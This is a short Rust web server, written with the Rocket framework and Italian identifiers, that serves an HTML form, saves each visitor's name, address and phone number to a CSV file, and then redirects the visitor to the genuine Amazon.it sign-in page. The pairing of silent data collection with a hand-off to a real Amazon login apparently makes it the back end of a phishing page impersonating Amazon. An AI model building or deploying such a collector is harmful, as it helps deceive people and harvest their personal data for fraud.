#[macro_use] extern crate rocket;

use rocket::form::Form;
use rocket::response::{content::RawHtml, Redirect};
use std::fs::OpenOptions;
use csv::Writer;
use serde::Serialize;

#[derive(FromForm, Serialize)]
struct UserData {
    nome: String,
    indirizzo: String,
    telefono: String,
}

#[get("/")]
fn index() -> RawHtml<String> {
    let content = std::fs::read_to_string("./src/page/main.html").unwrap();
    RawHtml(content)
}

#[post("/submit", data = "<user_form>")]
fn submit(user_form: Form<UserData>) -> Redirect {
    let dati_del_utente = user_form.into_inner();

    let file = OpenOptions::new()
        .append(true)
        .create(true)
        .open("./src/data/data.csv");

    if let Ok(file) = file {
        let mut writer = Writer::from_writer(file);
        if writer.serialize(&dati_del_utente).is_ok() {
            writer.flush().unwrap();
            Redirect::to("https://www.amazon.it/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.it%2Flog%2Fs%3Fk%3Dlog%2Bin%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=itflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0")
        } else {
            Redirect::to("/error") 
        }
    } else {
        Redirect::to("/error")
    }
}

#[get("/error")]
fn error_page() -> RawHtml<String> {
    RawHtml("<p>Si è verificato un errore durante l'elaborazione. Riprova.</p>".to_string())
}

#[launch]
fn rocket() -> _ {
    rocket::build()
        .mount("/", routes![index, submit, error_page]) 
}
